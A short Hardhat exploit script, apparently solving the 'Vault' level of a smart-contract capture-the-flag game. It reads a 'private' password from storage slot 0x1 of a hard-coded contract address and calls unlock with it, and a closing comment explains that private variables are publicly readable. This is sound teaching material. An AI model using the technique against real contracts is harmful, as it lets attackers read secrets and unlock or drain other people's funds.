import { ethers } from "hardhat";
// import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/8.Vault/Vault.sol/Vault.json";
import { Contract } from "ethers";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0xFbb17596577321579daDf9eAB6D63CC2bC6e226C";

async function main() {
  const [attacker] = await ethers.getSigners();
  const password = await ethers.provider.getStorageAt(targetAddress, "0x1");
  const target = new Contract(targetAddress, abi, attacker);

  const tx = await target.connect(attacker).unlock(password);
  await tx.wait();

  const locked = await target.connect(attacker).locked();
  displayResult(!locked);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
Private variables are stored in the contract storage. Storage slot can be accessed
by anybody.
First compute the storage slot:
0x0 --> locked (bool)
0x1 --> password (bytes32)
Seconde use the rpc method getStorageAt with the contract address and the storage slot 
and call the unlock function.

*/
